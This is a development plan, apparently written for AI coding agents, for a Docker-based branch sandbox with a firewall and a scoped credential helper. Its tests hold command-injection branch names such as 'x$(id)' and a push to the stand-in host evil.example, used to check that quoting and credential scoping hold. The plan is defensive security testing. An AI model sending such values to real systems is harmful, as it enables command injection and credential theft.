# Branch Containers (phase 1) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** `kunj container` starts a sandboxed Docker container for a branch (own clone from origin, no bind mounts), with start/shell/exec/agent/attach/list/stop/remove, manual port forwarding, a network-helper firewall, keep files and hooks.

**Architecture:** A `ContainerBackend` interface (src/lib/container/backend.ts) is the only thing that talks to Docker; `LocalDockerBackend` spawns the `docker` CLI. `lifecycle.ts` orchestrates start/stop/remove against the interface and is unit-tested with a fake backend. The command sits on the fast path, so no AWS/LangChain/inquirer imports at module top level.

**Tech Stack:** TypeScript (strict, ES2022, CommonJS), Node 20 `child_process.spawn`, Jest + ts-jest, Docker CLI ≥ 24 (BuildKit), Alpine + iptables for the helper image.

**Spec:** docs/specs/branch-containers.md (sections *Decisions* through *Hooks*, *JSON*, *Errors*, *Testing*, phase 1 of *Phases*). Phase 2+ items (services, `open`, `prune`, DinD, `--auto`) are out of scope here even where the spec's tables mention them; settings for them are **not** registered yet.

## Global Constraints

- No host bind mounts: files enter containers only via `copyIn` (tar stream); build contexts only via `docker build -` (tar on stdin).
- Secrets: `--env-file <0600 temp file>` deleted right after `docker run`; never on the command line; never in labels.
- No kunj state about containers on the host; Docker labels (`kunj.repo`, `kunj.branch`, `kunj.base`, `kunj.version`, `kunj.options`) are the only state.
- Fast path: `src/commands/container.ts` and `src/lib/container/*` import nothing heavier than `child_process`, `fs`, `path`, `crypto`, `chalk`; `inquirer` only via `await import()` inside the picker/confirm paths.
- Naming: `kunj-<repo>-<b>-<h>` where `<b> = branchToDirName(branch)` and `<h>` = first 6 hex chars of `sha1(repoId + "\n" + branch)`.
- Sandbox user: `dev` (uid 1000) in `kunj-sandbox`; for devcontainer images the image's non-root user; root is refused.
- The agent container is run with **no** added capabilities; only the helper gets `--cap-add NET_ADMIN --cap-add NET_RAW`.
- Code style: match src/lib/worktree.ts (section comments, `async` functions returning structured results, errors thrown with user-facing messages). Tests live in `src/lib/container/__tests__/*.test.ts` and `src/commands/__tests__/`.
- Commit after every task; `npm run lint` and `npm test` must pass before each commit.

## Review Focus

1. A branch named `feature/x` and another named `feature-x` in the same repo must get different containers (Task 3 test `names differ when branchToDirName collides`).
2. A devcontainer.json committed by the agent with `"remoteUser": "root"` must not run the agent as root (Task 4 test `refuses remoteUser root`).
3. `git push https://evil.example/x` from inside must get no credentials (Task 7 unit test on the helper script's host check; Task 12 integration test).
4. `kunj ct remove` on a stopped container with a second, unpushed local branch must refuse (Task 8 test `remove guard refuses on unpushed refs`).
5. `kunj ct list --json` must return within the exec timeout when a container's exec hangs (Task 8 test `status times out per container`).

---

### Task 1: Shell-quote hook variables (prerequisite fix)

**Files:**
- Modify: `src/lib/hooks.ts:325-327` (the `configuredHookCommands` loop in `runHook`)
- Modify: `src/lib/config-vars.ts` (add `shellQuote`)
- Test: `src/lib/__tests__/hooks.test.ts`, `src/lib/__tests__/config-vars.test.ts`

**Interfaces:**
- Produces: `export function shellQuote(value: string): string` in config-vars.ts — POSIX single-quoting (`'` → `'\''`); `export function expandVariablesQuoted(value: string, vars: ConfigVariables): string` — like `expandVariables` but every substituted value passes through `shellQuote`. Unknown variables stay verbatim.

- [ ] **Step 1: Write the failing tests**

```ts
// config-vars.test.ts
it('shellQuote wraps in single quotes and escapes embedded ones', () => {
  expect(shellQuote("a b")).toBe("'a b'");
  expect(shellQuote("it's")).toBe("'it'\\''s'");
  expect(shellQuote("")).toBe("''");
});
it('expandVariablesQuoted quotes substituted values only', () => {
  expect(expandVariablesQuoted('echo ${branch} ${nope}', { branch: 'x$(id)' })).toBe("echo 'x$(id)' ${nope}");
});
// hooks.test.ts (posixOnly)
it('does not execute shell syntax in a branch name', async () => {
  const marker = path.join(tmp, 'pwned');
  const result = await runHook('post-worktree-create', worktreeHookContext(repo, worktree, `x$(touch ${marker})`), {
    hooks: { 'post-worktree-create': [`echo ${'${branch}'} > '${logFile}'`] },
  });
  expect(result.ok).toBe(true);
  expect(fs.existsSync(marker)).toBe(false);
  expect(fs.readFileSync(logFile, 'utf8').trim()).toBe(`x$(touch ${marker})`);
});
```

- [ ] **Step 2: Run them to verify they fail**

Run: `npm test -- src/lib/__tests__/config-vars.test.ts src/lib/__tests__/hooks.test.ts`
Expected: FAIL — `shellQuote is not a function`; the marker file exists.

- [ ] **Step 3: Implement `shellQuote` and `expandVariablesQuoted` in config-vars.ts; switch hooks.ts:326 to `expandVariablesQuoted`**

Update the existing test at hooks.test.ts:204 (`runs configured commands through the shell with variables expanded`): the `command` assertion now expects the quoted form `'feature/x' in '<worktree>' of '<repoName>'`; the log-file assertion is unchanged.

- [ ] **Step 4: Run the tests to verify they pass**

Run: `npm test -- src/lib/__tests__/config-vars.test.ts src/lib/__tests__/hooks.test.ts`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/lib/config-vars.ts src/lib/hooks.ts src/lib/__tests__/config-vars.test.ts src/lib/__tests__/hooks.test.ts
git commit -m "Shell-quote expanded variables in configured hook commands"
```

---

### Task 2: Settings, config types and hook definitions

**Files:**
- Create: `src/settings/container.ts`
- Modify: `src/settings/index.ts` (import + call `registerContainerSettings()`)
- Modify: `src/types/index.ts:54-59` (add `container?:` block, extend `HookName` use)
- Modify: `src/lib/hook-defs.ts` (4 hook names + definitions)
- Test: `src/lib/__tests__/hooks.test.ts` (definition presence), `src/settings/__tests__/container.test.ts`

**Interfaces:**
- Produces: config shape

```ts
container?: {
  image?: string; agentCommand?: string; env?: string[]; files?: string[]; keepFiles?: boolean;
  network?: { allow?: string[]; allowHost?: boolean };
  dockerContext?: string; cpus?: string; memory?: string; publish?: string[];
};
```

- Produces: `HookName` gains `'pre-container-create' | 'post-container-create' | 'pre-container-delete' | 'post-container-delete'`, each with `args: ['branch', 'container', 'image']`; pre-* abort on failure.
- Produces: `export const CONTAINER_ENV_DEFAULT = ['ANTHROPIC_API_KEY', 'CLAUDE_CODE_OAUTH_TOKEN', 'CLAUDE_CODE_USE_BEDROCK', 'AWS_REGION', 'GH_TOKEN']` and `export const CONTAINER_AGENT_COMMAND_DEFAULT = 'claude --dangerously-skip-permissions'` in `src/lib/container/defaults.ts` (no imports, like worktree-defaults.ts).

- [ ] **Step 1: Write the failing tests**

```ts
// src/settings/__tests__/container.test.ts
it('registers the container settings with their defaults', () => {
  initializeSettings();
  const defaults = settingsRegistry.getDefaultConfig().container;
  expect(defaults).toEqual({
    image: '', agentCommand: 'claude --dangerously-skip-permissions',
    env: ['ANTHROPIC_API_KEY', 'CLAUDE_CODE_OAUTH_TOKEN', 'CLAUDE_CODE_USE_BEDROCK', 'AWS_REGION', 'GH_TOKEN'],
    files: [], keepFiles: true, network: { allow: [], allowHost: false },
    dockerContext: '', cpus: '', memory: '', publish: [],
  });
  expect(settingsRegistry.get('hooks.pre-container-create')).toBeDefined();
});
// hooks.test.ts
it('defines the container hooks', () => {
  const names = HOOKS.map(h => h.name);
  expect(names).toEqual(expect.arrayContaining(['pre-container-create', 'post-container-create', 'pre-container-delete', 'post-container-delete']));
  expect(HOOKS.find(h => h.name === 'pre-container-create')).toMatchObject({ args: ['branch', 'container', 'image'], abortsOnFailure: true });
});
```

- [ ] **Step 2: Run to verify they fail** — `npm test -- src/settings src/lib/__tests__/hooks.test.ts` → FAIL (module not found / undefined).

- [ ] **Step 3: Implement** `registerContainerSettings()` (category `container`, descriptions from the spec's settings table, `env`/`files`/`publish`/`network.allow` as `array`), the types, the defaults module and the four `HOOKS` entries (descriptions: "Runs before `kunj container start` creates a container. A non-zero exit aborts it." etc.).

- [ ] **Step 4: Run tests + lint** — `npm test -- src/settings src/lib/__tests__/hooks.test.ts && npm run lint` → PASS.

- [ ] **Step 5: Commit** — `git commit -m "Register container settings, config types and hooks"`

---

### Task 3: Names, labels and repo id

**Files:**
- Create: `src/lib/container/names.ts`
- Test: `src/lib/container/__tests__/names.test.ts`

**Interfaces:**
- Consumes: `branchToDirName` from `../worktree`, `repoNameFromUrl` from `../config`.
- Produces:

```ts
export function repoIdFromUrl(url: string): string;        // 'github.com/org/repo' (lowercase, no scheme/user/.git/trailing slash; local paths unchanged)
export function nameHash(repoId: string, branch: string): string; // 6 hex chars of sha1(`${repoId}\n${branch}`)
export interface ContainerNames { container: string; helper: string; workspaceVolume: string; homeVolume: string; network: string; }
export function containerNames(repoName: string, repoId: string, branch: string): ContainerNames;
export const LABEL = { repo: 'kunj.repo', branch: 'kunj.branch', base: 'kunj.base', version: 'kunj.version', options: 'kunj.options', role: 'kunj.role' } as const; // role: 'main' | 'helper'
export function labelsFor(repoId: string, branch: string, extra?: Record<string, string>): Record<string, string>;
export function labelsMatch(labels: Record<string, string> | undefined, repoId: string, branch: string): boolean;
```

- [ ] **Step 1: Write the failing tests**

```ts
it('derives one repo id from ssh and https forms', () => {
  expect(repoIdFromUrl('git@github.com:Org/Repo.git')).toBe('github.com/org/repo');
  expect(repoIdFromUrl('https://user@github.com/Org/Repo/')).toBe('github.com/org/repo');
  expect(repoIdFromUrl('/Users/a/repo.git')).toBe('/users/a/repo');
});
it('names differ when branchToDirName collides', () => {
  const a = containerNames('kunj', 'github.com/o/kunj', 'feature/x');
  const b = containerNames('kunj', 'github.com/o/kunj', 'feature-x');
  expect(a.container).toMatch(/^kunj-kunj-feature-x-[0-9a-f]{6}$/);
  expect(a.container).not.toBe(b.container);
  expect(a.helper).toBe(`${a.container}-net-helper`);
  expect(a.workspaceVolume).toBe(`${a.container}-ws`);
  expect(a.network).toBe(`${a.container}-net`);
});
it('labelsMatch requires repo and branch', () => {
  const labels = labelsFor('github.com/o/kunj', 'feature/x');
  expect(labelsMatch(labels, 'github.com/o/kunj', 'feature/x')).toBe(true);
  expect(labelsMatch(labels, 'github.com/o/kunj', 'feature-x')).toBe(false);
  expect(labelsMatch(undefined, 'github.com/o/kunj', 'feature/x')).toBe(false);
});
```

- [ ] **Step 2: Run to verify fail** — `npm test -- src/lib/container/__tests__/names.test.ts` → FAIL.
- [ ] **Step 3: Implement names.ts** (Node `crypto.createHash('sha1')`).
- [ ] **Step 4: Run to verify pass.**
- [ ] **Step 5: Commit** — `git commit -m "Container names, labels and repo id"`

---

### Task 4: devcontainer.json subset

**Files:**
- Create: `src/lib/container/devcontainer.ts`
- Test: `src/lib/container/__tests__/devcontainer.test.ts`

**Interfaces:**
- Produces:

```ts
export interface DevcontainerSpec {
  image?: string;
  build?: { dockerfile: string; context: string; args: Record<string, string> }; // paths relative to repo root, '.devcontainer/' resolved
  containerEnv: Record<string, string>;
  remoteUser?: string;          // validated: never 'root' / '0'
  forwardPorts: number[];
  postCreateCommand?: string;   // string or string[] joined with ' '
  postStartCommand?: string;
  hasComposeFile: boolean;
  ignoredKeys: string[];        // keys present but unsupported (for the one-time warning)
}
export function parseJsonc(text: string): unknown;   // strips // and /* */ comments and trailing commas
export function parseDevcontainer(text: string, filePath: string): DevcontainerSpec; // throws Error('remoteUser must be a non-root user (got "root")')
export const DEVCONTAINER_PATHS = ['.devcontainer/devcontainer.json', '.devcontainer.json'];
```

- [ ] **Step 1: Write the failing tests** — `parses comments and trailing commas`; `resolves build paths relative to the json file` (`{"build":{"dockerfile":"Dockerfile"}}` at `.devcontainer/devcontainer.json` → `dockerfile: '.devcontainer/Dockerfile', context: '.devcontainer'`); `refuses remoteUser root` (`remoteUser: 'root'` and `'0'` both throw); `joins array postCreateCommand`; `records ignored keys` (`features`, `customizations`, `mounts`, `workspaceMount` listed; `dockerComposeFile` sets `hasComposeFile`).
- [ ] **Step 2: Run to verify fail.**
- [ ] **Step 3: Implement** (hand-written JSONC stripper is fine — no dependency).
- [ ] **Step 4: Run to verify pass.**
- [ ] **Step 5: Commit** — `git commit -m "Parse the supported devcontainer.json subset"`

---

### Task 5: Backend interface and LocalDockerBackend

**Files:**
- Create: `src/lib/container/backend.ts`, `src/lib/container/docker.ts`
- Test: `src/lib/container/__tests__/docker.test.ts` (spawn mocked via `jest.mock('child_process')`)

**Interfaces:**
- Produces (backend.ts):

```ts
export interface Labels { [key: string]: string }
export interface ContainerInfo { id: string; name: string; state: 'running' | 'exited' | 'created' | 'paused' | 'restarting' | 'dead'; image: string; createdAt: string; labels: Labels; ports: Array<{ container: number; host: number }>; }
export interface ContainerSpec { name: string; image: string; labels: Labels; env: Record<string, string>; network: string; user?: string; workdir: string; volumes: Array<{ name: string; path: string }>; publish: Array<{ container: number; host: number }>; cpus?: string; memory?: string; capabilities?: string[]; networkOf?: string; init?: boolean; command: string[]; }
export interface ExecIO { stdin?: NodeJS.ReadableStream | 'inherit' | 'ignore'; stdout?: NodeJS.WritableStream | 'inherit'; stderr?: NodeJS.WritableStream | 'inherit'; tty?: boolean; user?: string; workdir?: string; env?: Record<string, string>; timeoutMs?: number; }
export class ExecTimeoutError extends Error {}
export interface BuildOptions { dockerfile?: string; buildArgs?: Record<string, string>; }
export interface ContainerBackend {
  readonly features: { localPorts: boolean; editorAttach: boolean; dockerInDocker: Array<'sysbox' | 'privileged'> };
  info(): Promise<{ serverVersion: string }>;        // throws Error('Docker is not available: <stderr>')
  imageExists(tag: string): Promise<boolean>;
  buildImage(tag: string, context: NodeJS.ReadableStream, opts?: BuildOptions): Promise<void>;
  createNetwork(name: string, labels: Labels): Promise<void>;
  createVolume(name: string, labels: Labels): Promise<void>;
  run(spec: ContainerSpec): Promise<string>;
  list(filter: Labels): Promise<ContainerInfo[]>;
  inspectLabels(name: string): Promise<Labels | null>;  // null when absent
  exec(id: string, cmd: string[], io?: ExecIO): Promise<{ exitCode: number; stdout: string }>;  // stdout captured unless io.stdout given
  copyIn(id: string, dir: string, tar: NodeJS.ReadableStream): Promise<void>;
  start(id: string): Promise<void>;
  stop(id: string): Promise<void>;
  remove(ids: { containers?: string[]; volumes?: string[]; networks?: string[] }): Promise<void>;
}
```

- Produces (docker.ts): `export class LocalDockerBackend implements ContainerBackend { constructor(options?: { context?: string; dockerPath?: string }) }` and pure helpers exported for tests: `export function runArgs(spec: ContainerSpec, envFile: string): string[]`, `export function parsePsJson(lines: string): ContainerInfo[]`.
- `run()` writes `spec.env` to a temp file `fs.mkdtempSync(path.join(os.tmpdir(), 'kunj-env-'))/env` with mode 0600, passes `--env-file`, and removes the directory in `finally`.
- `list()` uses `docker ps -a --format '{{json .}}' --filter label=<k>=<v>...` plus `docker inspect` for labels/ports of the matches (two subprocesses per listing, not per container).
- `exec()` with `timeoutMs` kills the child and rejects with `ExecTimeoutError`.
- `features` = `{ localPorts: true, editorAttach: true, dockerInDocker: [] }`.

- [ ] **Step 1: Write the failing tests** — `runArgs puts labels, volumes, network, user, publish on 127.0.0.1 and no caps by default` (asserts exact array incl. `--init`, `--env-file <file>`, `-p 127.0.0.1:13000:3000`, `--label kunj.repo=...`); `runArgs adds --cap-add and --network container:<id> for the helper spec`; `runArgs never contains an env value`; `parsePsJson maps State and Names`; `exec rejects with ExecTimeoutError when the child does not exit` (fake child via mocked spawn, `jest.useFakeTimers`).
- [ ] **Step 2: Run to verify fail.**
- [ ] **Step 3: Implement backend.ts and docker.ts.** Every call prepends `--context <ctx>` when set. Non-zero exits throw `Error(<first line of stderr>)`.
- [ ] **Step 4: Run to verify pass; `npm run lint`.**
- [ ] **Step 5: Commit** — `git commit -m "ContainerBackend interface and local docker backend"`

---

### Task 6: Images: sandbox, network helper, resolution and hashing

**Files:**
- Create: `src/container/sandbox/Dockerfile`, `src/container/sandbox/git-credential-kunj` (sh), `src/container/nethelper/Dockerfile`, `src/container/nethelper/firewall.sh`, `scripts/copy-container-assets.js`
- Create: `src/lib/container/image.ts`
- Modify: `package.json` (`"build": "tsc && node scripts/copy-container-assets.js"`)
- Test: `src/lib/container/__tests__/image.test.ts`

**Interfaces:**
- Produces:

```ts
export interface ImageSource { kind: 'setting' | 'devcontainer' | 'sandbox'; tag: string; build?: { contextTar: () => NodeJS.ReadableStream; dockerfile: string; buildArgs: Record<string, string> }; user: string; spec?: DevcontainerSpec; }
export function resolveImage(input: { setting: string; devcontainer: { spec: DevcontainerSpec; treeId: string; archive: () => NodeJS.ReadableStream } | null; repoName: string; kunjVersion: string }): ImageSource;
export function imageHash(dockerfileText: string, treeId: string, buildArgs: Record<string, string>): string; // 12 hex of sha1
export const SANDBOX_IMAGE = (version: string) => `kunj-sandbox:${version}`;
export const NETHELPER_IMAGE = (version: string) => `kunj-nethelper:${version}`;
export function sandboxAssetsDir(): string;  // path.join(__dirname, '..', '..', 'container') → works from dist/
export function tarDirectory(dir: string): NodeJS.ReadableStream; // minimal ustar writer, no dependency
export async function ensureImage(backend: ContainerBackend, source: ImageSource, warn: (msg: string) => void): Promise<string>; // builds when !imageExists
```

- Sandbox Dockerfile: `FROM debian:bookworm-slim`; apt `git git-lfs curl ca-certificates tmux socat iproute2 procps zsh openssh-client`; Node LTS from nodesource; `npm install -g @anthropic-ai/claude-code`; `gh` from GitHub's apt repo; `useradd -m -u 1000 -s /bin/zsh dev`; `ENV NPM_CONFIG_PREFIX=/home/dev/.npm-global PATH=/home/dev/.npm-global/bin:$PATH`; copy `git-credential-kunj` to `/usr/local/bin` (0755); `USER dev`; `WORKDIR /workspace`. No sudo package.
- `git-credential-kunj`: on `get`, reads `host=` lines from stdin; if `$KUNJ_CREDENTIAL_HOST` equals that host and one of `GH_TOKEN`/`GITHUB_TOKEN`/`GITLAB_TOKEN` is set, prints `username=x-access-token` (or `oauth2` for GitLab) and `password=<token>`; otherwise prints nothing. `store`/`erase`: no-op.
- Network helper Dockerfile: `FROM alpine:3.20`; `apk add iptables ip6tables ipset bind-tools curl`; copy `firewall.sh`; `ENTRYPOINT ["/firewall.sh"]`. `firewall.sh` reads env `KUNJ_FW_MODE` (`default`|`allowlist`), `KUNJ_FW_SUBNET`, `KUNJ_FW_ALLOW_HOST` (`0`/`1`), `KUNJ_FW_DOMAINS` (space-separated), `KUNJ_FW_GITHUB` (`0`/`1`), `KUNJ_FW_ORIGIN_HOST`; applies the rules from the spec's *Network* section for v4 and v6, verifies (`curl --max-time 5 https://example.com` must fail in allowlist mode; origin host must resolve and connect), writes `READY` to stdout, then loops: every 300 s re-resolve and swap ipsets. Exit non-zero on verification failure.
- `scripts/copy-container-assets.js`: `fs.cpSync('src/container', 'dist/container', { recursive: true })`.

- [ ] **Step 1: Write the failing tests** — `resolveImage prefers setting, then devcontainer, then sandbox` (tags: setting value; `kunj-<repo>:<hash>`; `kunj-sandbox:<version>`); `imageHash changes with dockerfile, tree id and args`; `devcontainer image user comes from remoteUser else "dev"`; `tarDirectory produces entries readable by tar -t` (write a temp dir, pipe to `tar -t`, compare names; `posixOnly`).
- [ ] **Step 2: Run to verify fail.**
- [ ] **Step 3: Implement image.ts, the four asset files and the copy script.** Verify the assets by hand once: `docker build -t kunj-sandbox:dev src/container/sandbox` and `docker build -t kunj-nethelper:dev src/container/nethelper` both succeed; `docker run --rm kunj-sandbox:dev sh -c 'id -u; which git tmux socat claude gh git-lfs'` prints `1000` and five paths.
- [ ] **Step 4: Run tests, `npm run build`, confirm `dist/container/sandbox/Dockerfile` exists.**
- [ ] **Step 5: Commit** — `git commit -m "Sandbox and network-helper images, image resolution"`

---

### Task 7: Seed script and host-side origin checks

**Files:**
- Create: `src/lib/container/seed.ts`
- Test: `src/lib/container/__tests__/seed.test.ts` (uses real git in temp dirs, like keep.test.ts; `posixOnly`)

**Interfaces:**
- Produces:

```ts
export interface OriginState { originUrl: string; originHost: string; branchOnOrigin: boolean; unpushed: number; isSsh: boolean; }
export async function inspectOrigin(branch: string, cwd: string): Promise<OriginState>; // runs `git remote get-url origin`, `git fetch origin <branch>` (ignore failure), `git rev-list --count origin/<branch>..<branch>`
export async function refExistsOnOrigin(ref: string, cwd: string): Promise<boolean>;    // `git ls-remote --exit-code origin <ref>`
export async function pushBranch(branch: string, cwd: string): Promise<void>;           // `git push -u origin <branch>`
export interface SeedInput { originUrl: string; originHost: string; branch: string; create: boolean; base?: string; userName: string; userEmail: string; hasToken: boolean; }
export function seedScript(input: SeedInput): string; // POSIX sh, runs inside the container as the sandbox user
export const SEED_MARKER = '/workspace/.kunj-seeded';
export const SEED_MARKER_EXCLUDE = '.kunj-seeded';
export async function hostGitIdentity(cwd: string): Promise<{ name: string; email: string }>;
```

- `seedScript` emits: `set -e`; `git config --global user.name/email`; `git config --global push.autoSetupRemote true`; when `hasToken`: `git config --global credential.helper /usr/local/bin/git-credential-kunj` and `git config --global url."https://<host>/".insteadOf "git@<host>:"`; `[ -d /workspace/.git ] || git clone --recurse-submodules "<url>" /workspace`; `cd /workspace`; `git switch <branch>` or `git switch -c <branch> --no-track origin/<base>`; `echo .kunj-seeded >> .git/info/exclude`; `touch /workspace/.kunj-seeded`. All values pass through `shellQuote` from Task 1. `KUNJ_CREDENTIAL_HOST` is set in the container env by Task 8, not here.

- [ ] **Step 1: Write the failing tests** — `inspectOrigin counts unpushed commits against a bare origin` (init bare, clone, commit twice, push once → `unpushed: 1`, `branchOnOrigin: true`); `inspectOrigin reports a branch missing on origin`; `seedScript quotes the branch` (branch `x$(id)` appears as `'x$(id)'`); `seedScript uses switch -c with --no-track for create`; `seedScript configures insteadOf only with a token`; `git-credential-kunj answers only for KUNJ_CREDENTIAL_HOST` (spawn the sh script from `src/container/sandbox` with `host=github.com` vs `host=evil.example`, env `GH_TOKEN=t KUNJ_CREDENTIAL_HOST=github.com`; expect `password=t` only for the first).
- [ ] **Step 2: Run to verify fail.**
- [ ] **Step 3: Implement seed.ts.**
- [ ] **Step 4: Run to verify pass.**
- [ ] **Step 5: Commit** — `git commit -m "Container seed script and origin checks"`

---

### Task 8: Lifecycle: start, stop, remove, status

**Files:**
- Create: `src/lib/container/lifecycle.ts`, `src/lib/container/__tests__/fake-backend.ts`
- Test: `src/lib/container/__tests__/lifecycle.test.ts`

**Interfaces:**
- Consumes: Tasks 3–7; `applyKeptFiles`-style listing via `listKeptFiles()`/`getKeepDir()` from `../keep`; `expandVariables` from `../config-vars`; `runActionHook` from `../hooks`; `resolveBaseRef` from `../base-branch`.
- Produces:

```ts
export interface StartOptions { branch: string; create: boolean; base?: string; imageOverride?: string; publish: number[]; rebuild: boolean; config: KunjConfig; repo: { root: string; name: string; id: string; originUrl: string }; kunjVersion: string; hostEnv: NodeJS.ProcessEnv; cwd: string; jsonMode: boolean; skipHooks: boolean; keepOnError: boolean; confirmPush: () => Promise<boolean>; warn: (msg: string) => void; }
export interface StartResult { names: ContainerNames; containerId: string; image: string; created: boolean; seeded: boolean; keptFiles: string[]; copiedFiles: string[]; publish: Array<{ container: number; host: number }>; firewall: 'default' | 'allowlist'; }
export async function startContainer(backend: ContainerBackend, options: StartOptions): Promise<StartResult>;
export async function stopContainer(backend: ContainerBackend, names: ContainerNames): Promise<void>;
export interface RemoveGuard { unpushedRefs: string[]; stashes: number; dirty: boolean; originReachable: boolean; }
export async function inspectForRemove(backend: ContainerBackend, names: ContainerNames, user: string): Promise<RemoveGuard>;
export async function removeContainer(backend: ContainerBackend, names: ContainerNames, opts: { force: boolean; keepVolumes: boolean; user: string }): Promise<RemoveGuard>; // throws Error('Container has unpushed work: ...; use --force') unless force
export interface ContainerStatus { agentRunning: boolean | null; head: string | null; ahead: number | null; dirty: boolean | null; status: 'ok' | 'timeout' | 'error' | 'stopped'; }
export async function containerStatus(backend: ContainerBackend, id: string, user: string, timeoutMs?: number): Promise<ContainerStatus>; // default 2000
export function forwardedEnv(config: KunjConfig['container'], hostEnv: NodeJS.ProcessEnv, vars: ConfigVariables): Record<string, string>; // AWS_ACCESS_KEY_ID/SECRET/SESSION_TOKEN/AWS_PROFILE only when CLAUDE_CODE_USE_BEDROCK is truthy
export function firewallEnv(config: KunjConfig['container'], subnet: string, originHost: string, bedrockRegion: string | undefined): Record<string, string>;
export class StartError extends Error { constructor(message: string, readonly code: 'unpushed' | 'base-missing' | 'no-token' | 'docker' | 'image' | 'seed' | 'firewall' | 'collision') }
```

- `startContainer` order = spec *Starting a container* steps 1–9, with: label check via `inspectLabels` (collision → `StartError('collision')`); `createNetwork` then read its subnet via `backend.exec`-free path: the helper computes the subnet itself from `ip route` (so no extra docker call); helper spec = `{ image: NETHELPER_IMAGE, networkOf: <container id>, capabilities: ['NET_ADMIN','NET_RAW'], env: firewallEnv(...), command: [] , labels: role=helper }`; wait for `READY` by `exec`-ing `sh -c 'for i in $(seq 50); do [ -f /tmp/ready ] && exit 0; sleep 0.2; done; exit 1'`... — simpler: helper writes `/tmp/kunj-ready` and kunj polls it via `backend.exec(helperId, ['test','-f','/tmp/kunj-ready'], {timeoutMs: 500})` up to 15 s; seed via `backend.exec(id, ['sh','-c', seedScript(...)], { user, stdout: 'inherit' })` unless `exec(id, ['test','-f', SEED_MARKER])` is 0; keep files and `container.files` tar-streamed with `tarDirectory`/an in-memory tar into `/workspace` and `~`; rollback = `backend.remove({...everything created this run})` on any throw unless `keepOnError`.
- `fake-backend.ts`: `export class FakeBackend implements ContainerBackend` recording every call in `calls: Array<{ method: string; args: unknown[] }>`, with programmable `execResults: Map<string, { exitCode: number; stdout: string }>` keyed by the joined command, `failOn?: string` (method name that throws), and `existing: ContainerInfo[]`.

- [ ] **Step 1: Write the failing tests**

Names of the tests and their key assertions:
- `creates network, volumes, helper and container in order` — `calls.map(c=>c.method)` begins `['info','inspectLabels','imageExists','createNetwork','createVolume','createVolume','run','run','exec'...]`; the main `run` spec has `capabilities: undefined`, `init: true`, `command: ['sleep','infinity']`, `user: 'dev'`; the helper `run` spec has `networkOf` = main id and the two caps.
- `refuses a name whose labels do not match` — `existing` has the container name with `kunj.branch=feature-x`, start of `feature/x` → `StartError` code `collision`, no `run`.
- `fails with unpushed when the user declines the push` — `confirmPush` → false, `inspectOrigin` mocked (`jest.mock('../seed')`) to `unpushed: 2` → code `unpushed`, no objects created.
- `rolls back everything created when seed fails` — `execResults` for the seed command → exit 1 → `remove` called with the container, helper, network and both volumes; with `keepOnError: true` → no `remove`.
- `skips seed when the marker exists and reruns it when missing`.
- `forwards AWS keys only with Bedrock` — `forwardedEnv` with/without `CLAUDE_CODE_USE_BEDROCK=1`.
- `firewall mode is allowlist only when allow is non-empty`.
- `remove guard refuses on unpushed refs` — stopped container: `start` is called first; exec results give `refs/heads/other 1` → throws with `--force` in the message; `force: true` removes.
- `remove guard fails closed when origin is unreachable`.
- `status times out per container` — `FakeBackend.exec` returns a never-resolving promise when `timeoutMs` is set... implement as: the fake rejects with `ExecTimeoutError` when the command key is `'__hang__'`; assert `status: 'timeout'` and that the promise resolves.
- `status distinguishes no tmux session from exec failure` — stdout `tmux=1\n# branch.oid abc...` → `agentRunning: false`, `head: 'abc…'`.

- [ ] **Step 2: Run to verify fail.**
- [ ] **Step 3: Implement lifecycle.ts and fake-backend.ts.**
- [ ] **Step 4: Run to verify pass; `npm run lint`.**
- [ ] **Step 5: Commit** — `git commit -m "Container lifecycle: start, stop, remove guard, status"`

---

### Task 9: Port forwarding over exec

**Files:**
- Create: `src/lib/container/forward.ts`
- Test: `src/lib/container/__tests__/forward.test.ts`

**Interfaces:**
- Produces:

```ts
export interface ForwardSpec { container: number; host?: number; }
export function parseForwardSpec(text: string): ForwardSpec;   // '3000' | '8080:3000'; throws on non-numeric or out of range
export async function findFreePort(preferred: number): Promise<number>; // preferred if free on 127.0.0.1, else an OS-assigned port
export function tunnelCommand(port: number, hasSocat: boolean): string[]; // ['socat','-t','10','-','TCP:127.0.0.1:<port>'] or ['bash','-c','exec 3<>/dev/tcp/127.0.0.1/<port>; cat <&3 & cat >&3']
export interface Forwarder { hostPort: number; close(): Promise<void>; }
export async function forwardPort(backend: ContainerBackend, containerId: string, spec: ForwardSpec, opts: { hasSocat: boolean; onConnection?: () => void }): Promise<Forwarder>;
```

- `forwardPort`: `net.createServer` on `127.0.0.1:<hostPort>`; per socket call `backend.exec(id, tunnelCommand(...), { stdin: socket, stdout: socket, stderr: 'ignore'-equivalent })`; destroy the socket when exec resolves; `close()` closes the server and ends open sockets.

- [ ] **Step 1: Write the failing tests** — `parseForwardSpec` cases; `findFreePort returns preferred when free and another when taken` (occupy a port with a `net.Server`); `forwardPort pipes bytes through the backend exec` — a `FakeBackend` whose `exec` echoes stdin to stdout uppercased; connect with `net.connect`, write `hello`, expect `HELLO`; `close() stops accepting`.
- [ ] **Step 2: Run to verify fail.**
- [ ] **Step 3: Implement forward.ts.** (`FakeBackend.exec` from Task 8 must honour `io.stdin`/`io.stdout` streams when given — extend it here.)
- [ ] **Step 4: Run to verify pass.**
- [ ] **Step 5: Commit** — `git commit -m "Port forwarding over docker exec"`

---

### Task 10: The `container` command and fast path

**Files:**
- Create: `src/commands/container.ts`
- Modify: `src/commands/index.ts` (export + `getAllCommands()`), `src/commands/fast.ts:12-16` (`container` and `ct` entries), `src/index.ts` (alias handling if `ct` is not a Commander alias already — use `cmd.alias('ct')` via a new optional `aliases?: string[]` in `CommandConfig`, applied in `BaseCommand.register`)
- Test: `src/commands/__tests__/container.test.ts` (argument shifting and JSON shaping only; lifecycle mocked)

**Interfaces:**
- Consumes: everything above; `loadResolvedConfig`, `getRepoName`, `getKunjDir` from `../lib/config`; `recordRepo` from `../lib/repos`; `getVersion` pattern from `src/index.ts` (read package.json at runtime).
- Produces: `export class ContainerCommand extends BaseCommand` with `arguments: '[action] [target] [extra...]'`, options:

```
--json (global)  -c, --create  --base <ref>  --image <img>  --publish <ports>  --rebuild
--keep-on-error  --no-hooks  --no-status  -a, --all  -f, --force  --keep-volumes  --context <name>
```

